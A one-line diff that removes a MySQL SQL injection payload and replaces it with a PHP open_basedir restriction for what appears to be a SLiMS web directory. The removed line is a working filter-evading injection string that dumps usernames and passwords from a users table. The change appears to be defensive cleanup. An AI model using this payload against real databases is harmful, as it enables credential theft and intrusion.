@@ -1,1 +1,1 @@
-(/*!50000SELECT*/+/*!50000GROUP_CONCAT(username,0x203a3a20,password+SEPARATOR+0x3c62723e)*/+/*!50000FROM*/+users)
+open_basedir=/home/manbant1/public_html/slims:/tmp
